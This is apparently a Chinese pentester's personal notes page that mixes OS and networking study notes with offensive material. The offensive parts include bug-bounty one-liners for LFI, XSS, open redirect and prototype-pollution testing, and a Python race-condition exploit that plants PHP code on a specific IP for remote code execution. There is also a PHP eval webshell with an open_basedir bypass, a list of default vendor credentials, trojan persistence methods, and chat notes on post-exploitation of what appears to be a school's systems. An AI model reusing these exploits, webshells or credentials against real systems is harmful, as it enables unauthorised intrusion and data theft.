class="hljs-section">死锁的产生主要有两点:</span><br>资源竞争和进程间推进顺序非法<br><br>阻塞操作是指在执行设备操作时若不能获得资源则挂起进程，直到满足可操作的条件后再进行操作。被挂起的进程进入休眠状态，被从调度器的运行队列移走，直到等待的条件被满足。而非阻塞操作的进程在不能进行设备操作时并不挂起，它或者放弃，或者不停地查询，直至可以进行操作为止<br><br>死锁是多<br>阻塞可单可多<br><br>我的文件助手 0:33:20<br>阻塞在等待资源  期间是挂起的<br>死锁在争夺资源 期间是运行的<br></code></pre></td></tr></table></figure><p>在挖洞的时候一些提高效率的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs bash">本节定义了整个单行命令/脚本中使用的特定术语或占位符。<br><br>    1.1. <span class="hljs-string">&quot;HOST &quot;</span>定义了一个主机名、（子）域或IP地址，例如，用internal.host、domain.tld、sub.domain.tld或127.0.0.1取代。<br><br>    1.2. <span class="hljs-string">&quot;HOSTS.txt &quot;</span>包含标准1.1，在文件中超过一个。<br><br>    2.1. <span class="hljs-string">&quot;URL &quot;</span>肯定定义了URL，例如被http://domain.tld/path/page.html，或者有点以HTTP/HTTPS协议开始。<br><br>    2.2. 2.2. <span class="hljs-string">&quot;URLS.txt &quot;</span>包含标准2.1，在文件中不止一个。<br><br>    3.1. <span class="hljs-string">&quot;FILE.txt &quot;</span>或 <span class="hljs-string">&quot;FILE&#123;N&#125;.txt &quot;</span>是指根据上下文和需要运行命令/脚本所需的文件。<br><br>    4.1. <span class="hljs-string">&quot;OUT.txt &quot;</span>或 <span class="hljs-string">&quot;OUT&#123;N&#125;.txt &quot;</span>是指作为目标存储结果的文件将是被执行的命令。<br>    <br>    <br>本地文件包含 @dwisiswant0<br>gau HOST | gf lfi | qsreplace <span class="hljs-string">&quot;/etc/passwd&quot;</span> | xargs -I% -P 25 sh -c <span class="hljs-string">&#x27;curl -s &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;root:x&quot; &amp;&amp; echo &quot;VULN! %&quot;&#x27;</span><br><br>开放式重定向 @dwisiswant0<br><span class="hljs-built_in">export</span> LHOST=<span class="hljs-string">&quot;URL&quot;</span>; gau <span class="hljs-variable">$1</span> | gf redirect | qsreplace <span class="hljs-string">&quot;<span class="hljs-variable">$LHOST</span>&quot;</span> | xargs -I % -P 25 sh -c <span class="hljs-string">&#x27;curl -Is &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;Location: $LHOST&quot; &amp;&amp; echo &quot;VULN! %&quot;&#x27;</span><br><br>@N3T_hunt3r<br><span class="hljs-built_in">cat</span> URLS.txt | gf url | <span class="hljs-built_in">tee</span> url-redirect.txt &amp;&amp; <span class="hljs-built_in">cat</span> url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk &gt; /dev/null<br><br>XSS @cihanmehmet<br>gospider -S URLS.txt -c 10 -d 5 --blacklist <span class="hljs-string">&quot;.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)&quot;</span> --other-source | grep -e <span class="hljs-string">&quot;code-200&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span>| grep <span class="hljs-string">&quot;=&quot;</span> | qsreplace -a | dalfox pipe | <span class="hljs-built_in">tee</span> OUT.txt<br><br>@fanimalikhack<br>waybackurls HOST | gf xss | sed <span class="hljs-string">&#x27;s/=.*/=/&#x27;</span> | <span class="hljs-built_in">sort</span> -u | <span class="hljs-built_in">tee</span> FILE.txt &amp;&amp; <span class="hljs-built_in">cat</span> FILE.txt | dalfox -b YOURS.xss.ht pipe &gt; OUT.txt<br><br>@oliverrickfors<br><span class="hljs-built_in">cat</span> HOSTS.txt | getJS | httpx --match-regex <span class="hljs-string">&quot;addEventListener\((?:&#x27;|\&quot;)message(?:&#x27;|\&quot;)&quot;</span><br>原型链污染@R0X4R<br>subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt &amp;&amp; sed <span class="hljs-string">&#x27;s/$/\/?__proto__[testparam]=exploit\//&#x27;</span> FILE.txt | page-fetch -j <span class="hljs-string">&#x27;window.testparam == &quot;exploit&quot;? &quot;[VULNERABLE]&quot; : &quot;[NOT VULNERABLE]&quot;&#x27;</span> | sed <span class="hljs-string">&quot;s/(//g&quot;</span> | sed <span class="hljs-string">&quot;s/)//g&quot;</span> | sed <span class="hljs-string">&quot;s/JS //g&quot;</span> | grep <span class="hljs-string">&quot;VULNERABLE&quot;</span><br>查找 JavaScript 文件 @D0cK3rG33k<br>assetfinder --subs-only HOST | gau | egrep -v <span class="hljs-string">&#x27;(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)&#x27;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> url; <span class="hljs-keyword">do</span> vars=$(curl -s <span class="hljs-variable">$url</span> | grep -Eo <span class="hljs-string">&quot;var [a-zA-Zo-9_]+&quot;</span> | sed -e <span class="hljs-string">&#x27;s, &#x27;</span>var<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&quot;<span class="hljs-variable">$url</span>&quot;</span>?<span class="hljs-string">&#x27;,g&#x27;</span> -e <span class="hljs-string">&#x27;s/ //g&#x27;</span> | grep -v <span class="hljs-string">&#x27;.js&#x27;</span> | sed <span class="hljs-string">&#x27;s/.*/&amp;=xss/g&#x27;</span>):<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\e[1;33m<span class="hljs-variable">$url</span>\n&quot;</span> <span class="hljs-string">&quot;\e[1;32m<span class="hljs-variable">$vars</span>&quot;</span>; <span class="hljs-keyword">done</span><br><br>从JavaScript中提取端点@renniepak<br><span class="hljs-built_in">cat</span> FILE.js | grep -oh <span class="hljs-string">&quot;\&quot;\/[a-zA-Z0-9_/?=&amp;]*\&quot;&quot;</span> | sed -e <span class="hljs-string">&#x27;s/^&quot;//&#x27;</span> -e <span class="hljs-string">&#x27;s/&quot;$//&#x27;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从目标列表中获取CIDR和组织信息@steve_mcilwain<br><span class="hljs-keyword">for</span> HOST <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> HOSTS.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> $(<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(dig a <span class="hljs-variable">$HOST</span> +short); <span class="hljs-keyword">do</span> whois <span class="hljs-variable">$ip</span> | grep -e <span class="hljs-string">&quot;CIDR\|Organization&quot;</span> | <span class="hljs-built_in">tr</span> -s <span class="hljs-string">&quot; &quot;</span> | <span class="hljs-built_in">paste</span> - -; d<br>one | <span class="hljs-built_in">uniq</span>); <span class="hljs-keyword">done</span><br><br>从RapidDNS.io获取子域名@andirrahmani1<br>curl -s <span class="hljs-string">&quot;https://rapiddns.io/subdomain/<span class="hljs-variable">$1</span>?full=1#result&quot;</span> | grep <span class="hljs-string">&quot;&lt;td&gt;&lt;a&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;&quot;&#x27;</span> -f 2 | grep http | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;/&#x27;</span> -f3 | sed <span class="hljs-string">&#x27;s/#results//g&#x27;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从BufferOver.run获取子域@_ayoubfathi_<br>curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;,&#x27;</span> -f2 | <span class="hljs-built_in">sort</span> -u<br><br>@AnubhavSingh_<br><span class="hljs-built_in">export</span> domain=<span class="hljs-string">&quot;HOST&quot;</span>; curl <span class="hljs-string">&quot;https://tls.bufferover.run/dns?q=<span class="hljs-variable">$domain</span>&quot;</span> | jq -r .Results<span class="hljs-string">&#x27;[]&#x27;</span> | rev | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;,&#x27;</span> -f1 | rev | <span class="hljs-built_in">sort</span> -u | grep <span class="hljs-string">&quot;\.<span class="hljs-variable">$domain</span>&quot;</span><br><br>从Riddler.io获取子域名@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://riddler.io/search/exportcsv?q=pld:HOST&quot;</span> | grep -Po <span class="hljs-string">&quot;(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>Get Subdomains from VirusTotal@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>用cyberxplore获取子域名@pikpikcu<br>curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po <span class="hljs-string">&quot;(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> <br><br>从CertSpotter获取子域@caryhooper<br>curl -s <span class="hljs-string">&quot;https://certspotter.com/api/v1/issuances?domain=HOST&amp;include_subdomains=true&amp;expand=dns_names&quot;</span> | jq .[].dns_names | grep -Po <span class="hljs-string">&quot;(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从Archive中获取子域@pikpikcu<br>curl -s <span class="hljs-string">&quot;http://web.archive.org/cdx/search/cdx?url=*.HOST/*&amp;output=text&amp;fl=original&amp;collapse=urlkey&quot;</span> | sed -e <span class="hljs-string">&#x27;s_https*://__&#x27;</span> -e <span class="hljs-string">&quot;s/\/.*//&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从JLDC获取子域@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://jldc.me/anubis/subdomains/HOST&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从securitytrails获取子域@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://securitytrails.com/list/apex_domain/HOST&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | grep <span class="hljs-string">&quot;.HOST&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>Bruteforcing Subdomain using DNS Over@pikpikcu<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> sub; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;https://dns.google.com/resolve?name=<span class="hljs-variable">$sub</span>.HOST&amp;type=A&amp;cd=true&quot;</span> | parallel -j100 -q curl -s -L --silent  | grep -Po <span class="hljs-string">&#x27;[&#123;\[]&#123;1&#125;([,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]|&quot;.*?&quot;)+[&#125;\]]&#123;1&#125;&#x27;</span> | jq | grep <span class="hljs-string">&quot;name&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | grep <span class="hljs-string">&quot;.HOST&quot;</span> | <span class="hljs-built_in">sort</span> -u ; <span class="hljs-keyword">done</span> &lt; FILE.txt<br><br>FFUF 的子域暴力破解器 @GochaOqradze <br>ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep <span class="hljs-string">&quot;| URL |&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span><br><br>从 IP 地址查找 ASN 的分配 IP 范围 wains.be <br>whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | <span class="hljs-built_in">head</span> -1) | grep -w <span class="hljs-string">&quot;route:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -n<br><br>从文件中提取 IP @emenalf <br>grep -E -o <span class="hljs-string">&#x27;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&#x27;</span> file.txt<br><br>查找子域接管 <br>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass enum -norecursive -noalts -d HOST &gt;&gt; FILE; subjack -w FILE -t 100 -<span class="hljs-built_in">timeout</span> 30 -ssl -c <span class="hljs-variable">$GOPATH</span>/src/github.com/haccer/subjack/fingerprints.json -v 3 &gt;&gt; takeover ;<br><br>使用 cURL + Parallel 进行 URL 探测 <br><span class="hljs-built_in">cat</span> HOSTS.txt | parallel -j50 -q curl -w <span class="hljs-string">&#x27;Status:%&#123;http_code&#125;\t  Size:%&#123;size_download&#125;\t %&#123;url_effective&#125;\n&#x27;</span> -o /dev/null -skw<br><br>我个人觉得很有用的来了，注意哈。上面并不全，全的在原文，我翻译过来后，筛出来适合咱用的一些命令：<br><br>转储范围内的资产 chaos-bugbounty-list@dwisiswant0 <br>curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r <span class="hljs-string">&#x27;.programs[].domains | to_entries | .[].value&#x27;</span><br><br><br>转储范围内的资产 bounty-targets-data<br>HackerOne 程序 <br>curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=<span class="hljs-literal">true</span> | jq -r <span class="hljs-string">&#x27;.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv&#x27;</span><br><br><br>BugCrowd 程序 <br>curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r <span class="hljs-string">&#x27;.[].targets.in_scope[] | [.target, .type] | @tsv&#x27;</span><br><br>还有一些，在原文，hackerone的资产是每小时更新的可以进行差异化对比来获取到新的项目资产范围<br><br>从swagger.json提取端点 @zer0pwn  最常用的语句了<br>curl -s https://HOST/v2/swagger.json | jq <span class="hljs-string">&#x27;.paths | keys[]&#x27;</span><br><br><br>查找隐藏的服务器和/或管理面板  这个依托与字典了<br>ffuf -c -u URL -H <span class="hljs-string">&quot;Host: FUZZ&quot;</span> -w FILE.txt<br></code></pre></td></tr></table></figure><p>在你们用这些工具的时候最好开一台服务器来配置你们的工具环境变量，我用的centos缺什么从yum拉取或者你已经配置好了工具保证你的命令能够调用的到比如前面的subfinder，ffuf 不然的话会报错的，其余的命令看原文吧，重复利用的比较少</p><p>描述一下TCP拥塞控制的慢开始和拥塞避免<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051153095.png" alt="image-20220505115333924"></p><p> 看到这里的时候，特别是<a href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>.upload.progress.enable这个开启时，就想到了当传入文件上去时，有办法可以进行rce。刚开始时想用条件竞争，直接就用脚本读出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br>host = <span class="hljs-string">&#x27;http://114.115.134.72:32770/index.php&#x27;</span><br>sessid = <span class="hljs-string">&#x27;aa&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            host,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;ls /&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;a.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,<br>        )<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            <span class="hljs-keyword">break</span><br> <br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br>    READ(session)<br></code></pre></td></tr></table></figure><p>线程和进程有什么区别:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">资源：进程是资源分配的基本单位，但线程不拥有资源，线程能访问其所属进程的资源；<br>调度：线程是独立调度的基本单位，同一进程中线程的切换不会引起进程的切换，而不同进程间线程的切换会引起进程的切换；<br>系统开销：进程的新建和撤销时，系统需要为其分配和回收资源，如内存空间和<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>设备等，开销远大于线程的新建和撤销。进程的切换需要当前进程<span class="hljs-variable">CPU</span>环境的保护和新进程环境的设置，而线程的切换只需要保存和设置少量的寄存器内容，开销很小。因此，线程的系统开销远低于进程。<br>通信：线程可以直接读写进程数据进行通信，但进程需要<span class="hljs-variable">IPC</span>（进程间通信技术）进行通信<span class="hljs-punctuation">(</span>管道、消息队列、共享内存<span class="hljs-punctuation">)</span>。<br></code></pre></td></tr></table></figure><p>木马驻留系统的方式有哪些？</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">1</span>.利用操作系统的管理机制：比如写个服务，建立计划任务，将程序写入自启动目录，注册表驻留<br><span class="hljs-number">2</span>.利用操作系统的程序执行机制：比如dll劫持，<span class="hljs-built_in">path</span>劫持（<span class="hljs-built_in">shift</span>后门）<br><span class="hljs-number">3</span>.利用诱导触发的方式：比如宏病毒，快捷方式忽悠<br><span class="hljs-number">4</span>.想办法搞个帐号<br><span class="hljs-number">5</span>.利用第三方程序的漏洞：比如webshell，sql注入<br><span class="hljs-number">6</span>.第三方程序投毒<br></code></pre></td></tr></table></figure><p>SQLmap参数–os-shell的本质</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">那么<span class="hljs-comment">--os-shell的本质就是利用不同数据库的特性，在当前数据库用户权限足够的情况下利用其特性执行命令。</span><br>MySQL：有权限的情况下且得到物理路径可写恶意代码到目标，并利用脚本代码的函数执行系统命令。<br>mssql ：这个微软的数据库就是利用存储过程执行命令<br></code></pre></td></tr></table></figure><p>for &#x2F;L %P in (1,1,254) do @ping -w 10 -n 1 10.128.12.%P | findstr TTL</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205142248705.png" alt="image-20220514224856626"></p><p>八字节表示常用数字<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205151930560.png" alt="image-20220515193017495" style="zoom:150%;" /></p><ul><li><p>juniper 登录地址:<a href="https://192.168.1.1/">https://192.168.1.1</a> 用户名:netscreen 密码:netscreen</p><p>Cisco 登录地址:<a href="https://192.168.0.1/">https://192.168.0.1</a> 用户名:admin 密码:cisco</p><p>Huawei 登录地址:<a href="http://192.168.0.1/">http://192.168.0.1</a> 用户名:admin 密码:Admin@123</p><p>深信服 VPN：51111 端口 delanrecover</p><p>华为 VPN：账号：root 密码：mduadmin</p><p>华为防火墙：admin Admin@123 eudemon</p></li></ul><p>找到管理员登录口，可以尝试以下账号密码<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205151942329.png" alt="image-20220515194248253"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk">fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span>:<span class="hljs-number">53</span><br>学姐他们上线后很快就被断了<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">53</span>:<span class="hljs-number">03</span><br>检测力太强了<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span><br>权限维持还是很重要的<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">04</span><br>万欣数据库默认密码<br><br>你撤回了一条消息，因为有错别字。<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">52</span><br>连接后改数据库账号的密码<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">58</span><br>先找教工信息<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">58</span>:<span class="hljs-number">08</span><br>教工权限比较大一点<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">03</span><br>拿到账号后一定要先找其他的账号<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span><br>后渗透先搞<span class="hljs-number">80</span>端口 搞完成功后再找其他端口 这样比较快一点<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">17</span>:<span class="hljs-number">53</span><br>御剑端口扫描工具<br><br><br></code></pre></td></tr></table></figure><p>找工具的话要找那些开发平台兼容大的工具 </p><p>然后我就想着提权不了，也看不了上级的目录，那要怎么拿目标站？辛亏我师傅说可以用.user.ini和php文件来绕过目录的限制！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//.user.ini</span><br>open_basedir=:/<br><span class="hljs-comment">//user.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&quot;pass&quot;</span>])<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205202141969.png" alt="图片"></p><p>通过突破目录的限制，连上了新的shell后发现能看到全部的目录了</p><p><strong>重点是：</strong>本地解码编码操作不会触发杀软拦截行为！</p><p>用的菜刀，传了一个exe上去，要cd到exe的目录，但是目录有中文啊，我cd不过去啊，我想了很久不知道怎么解决，后来在吐司的论坛上看见，可以写入bat</p><p>先看看内网环境大概是什么情况</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205251110342.jpeg" alt="图片">遇到这种的，基本都是vCenter环境了 poc打入后</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">这里有个很坑的点，就是部分POC有linux模式和windows模式两种。而他们的逻辑有点问题，先用linux下的payload去打这个windows机器，但是不知道为什么，POC判断攻击成功了，于是就没有启用windows模式的payload。这就导致一开始我们迟迟写不上马。解决方案也很简单，直接删掉linux模式的payload，强制程序用windows模式来打。<br></code></pre></td></tr></table></figure><p>直接往这里面传马即可：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span 